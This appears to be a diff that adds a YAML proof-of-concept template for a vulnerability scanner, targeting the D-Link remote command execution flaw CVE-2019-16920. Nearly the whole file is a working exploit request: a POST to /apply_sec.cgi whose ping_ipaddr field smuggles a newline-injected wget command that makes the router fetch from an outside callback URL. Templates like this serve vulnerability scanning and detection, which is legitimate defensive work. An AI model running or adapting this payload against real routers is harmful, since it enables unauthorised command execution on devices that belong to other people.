@@ -1,0 +1,23 @@
+detail:
+  author: JingLing(https://hackfun.org/)
+  links:
+  - https://www.anquanke.com/post/id/187923
+  - https://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeye-bf6fec7f9bb3
+expression: r0()
+manual: true
+name: poc-yaml-dlink-cve-2019-16920-rce
+rules:
+  r0:
+    expression: response.status == 200 && reverse.wait(5)
+    request:
+      body: html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20{{reverseURL}}
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /apply_sec.cgi
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url
+transport: http
